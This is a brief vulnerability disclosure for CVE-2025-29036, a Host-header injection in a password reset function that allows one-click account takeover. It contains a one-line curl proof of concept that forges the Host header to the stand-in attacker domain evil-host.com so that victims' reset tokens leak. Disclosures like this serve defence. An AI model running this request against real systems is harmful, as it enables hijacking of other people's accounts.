#CVE-2025-29036: Host-header Injection in Password Reset Function (8.1.0)
1-click Account Take Over.  An external attacker could send password requests for users, but specify a "Host" header of a website that they control.
If the user receiving the mail clicks on the link, the attacker would retrieve the reset token of the victim and perform account takeover.

PoC: curl '<host>/forgot' -X POST -H 'Host: evil-host.com' -H <any needed header> --data-raw '_csrf=<csrf-token>&email=<victim-email>'
